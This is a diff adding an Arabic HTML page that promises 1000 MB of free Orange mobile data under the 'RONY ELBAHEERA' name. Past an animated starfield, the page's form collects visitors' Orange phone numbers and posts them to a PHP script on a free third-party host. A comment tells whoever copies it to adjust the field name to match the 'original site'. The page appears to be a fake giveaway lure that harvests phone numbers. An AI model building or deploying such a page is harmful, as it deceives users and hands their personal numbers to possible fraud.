@@ -1,0 +1,191 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>1000 ميجا أورنج مجانًا</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Tahoma, Arial, sans-serif;
+}
+
+body {
+  background: black;
+  overflow: hidden;
+  min-height: 100vh;
+  color: #fff;
+}
+
+/* ===== النجوم ===== */
+.star {
+  position: fixed;
+  width: 2px;
+  height: 2px;
+  background: white;
+  animation: fall linear infinite;
+  opacity: 0.9;
+}
+
+@keyframes fall {
+  from { transform: translateY(-10px); }
+  to   { transform: translateY(110vh); }
+}
+
+/* ===== الحاوية ===== */
+.container {
+  position: relative;
+  z-index: 5;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  text-align: center;
+  padding: 20px;
+}
+
+/* ===== العنوان ===== */
+.title {
+  font-size: 34px;
+  font-weight: bold;
+  margin-bottom: 10px;
+  text-shadow: 0 0 15px #00f;
+}
+
+.subtitle {
+  font-size: 15px;
+  color: #ccc;
+  margin-bottom: 20px;
+}
+
+/* ===== الاسم ===== */
+.logo {
+  font-size: 40px;
+  font-weight: bold;
+  letter-spacing: 3px;
+  animation: glow 3s infinite alternate;
+  margin-bottom: 20px;
+}
+
+@keyframes glow {
+  from { text-shadow: 0 0 10px #00f; }
+  to   { text-shadow: 0 0 25px #0ff; }
+}
+
+/* ===== الكواكب ===== */
+.planet {
+  position: absolute;
+  width: 140px;
+  opacity: 0;
+  animation: planetShow 18s infinite;
+}
+
+.planet:nth-child(1) { animation-delay: 0s; }
+.planet:nth-child(2) { animation-delay: 6s; }
+.planet:nth-child(3) { animation-delay: 12s; }
+
+@keyframes planetShow {
+  0%   { opacity: 0; transform: scale(0.6); }
+  10%  { opacity: 1; }
+  30%  { opacity: 1; transform: scale(1); }
+  40%  { opacity: 0; }
+  100% { opacity: 0; }
+}
+
+/* ===== الفورم ===== */
+.form-box {
+  background: rgba(255,255,255,0.08);
+  padding: 22px;
+  border-radius: 18px;
+  backdrop-filter: blur(6px);
+  width: 100%;
+  max-width: 360px;
+}
+
+input {
+  padding: 12px;
+  width: 100%;
+  border-radius: 10px;
+  border: none;
+  outline: none;
+  margin-bottom: 12px;
+  text-align: center;
+  font-size: 16px;
+}
+
+button {
+  padding: 12px 30px;
+  width: 100%;
+  border: none;
+  border-radius: 10px;
+  background: #00bfff;
+  color: black;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #0ff;
+}
+
+/* ===== الفوتر ===== */
+.footer {
+  position: fixed;
+  bottom: 10px;
+  width: 100%;
+  text-align: center;
+  font-size: 13px;
+  color: #aaa;
+  z-index: 6;
+}
+</style>
+</head>
+
+<body>
+
+<!-- ===== الكواكب ===== -->
+<img class="planet" src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Saturn_during_Equinox.jpg" style="top:12%; left:8%;">
+<img class="planet" src="https://upload.wikimedia.org/wikipedia/commons/9/97/The_Earth_seen_from_Apollo_17.jpg" style="top:18%; right:8%;">
+<img class="planet" src="https://upload.wikimedia.org/wikipedia/commons/0/02/OSIRIS_Mars_true_color.jpg" style="bottom:14%; left:40%;">
+
+<div class="container">
+  <div class="logo">RONY ELBAHEERA</div>
+
+  <div class="title">🎁 1000 ميجا أورنج مجانًا</div>
+  <div class="subtitle">⚠️ يمكن استخدام العرض مرة واحدة كل 5 أيام</div>
+
+  <!-- الفورم المربوط بالموقع الأصلي -->
+  <form class="form-box"
+        action="https://hamo777.iceiy.com/orange500gift.php"
+        method="POST"
+        target="_blank">
+    <!-- لو اسم الحقل مختلف غيّره -->
+    <input type="text" name="phone" placeholder="أدخل رقم أورنج" required>
+    <button type="submit">إضافة الهدية 🚀</button>
+  </form>
+</div>
+
+<div class="footer">
+  © Rony Elbaheera — All Rights Reserved 2025–2026
+</div>
+
+<script>
+/* ===== توليد النجوم ===== */
+for (let i = 0; i < 170; i++) {
+  const star = document.createElement("div");
+  star.className = "star";
+  star.style.left = Math.random() * 100 + "vw";
+  star.style.animationDuration = (Math.random() * 3 + 2) + "s";
+  star.style.opacity = Math.random();
+  document.body.appendChild(star);
+}
+</script>
+
+</body>
+</html>
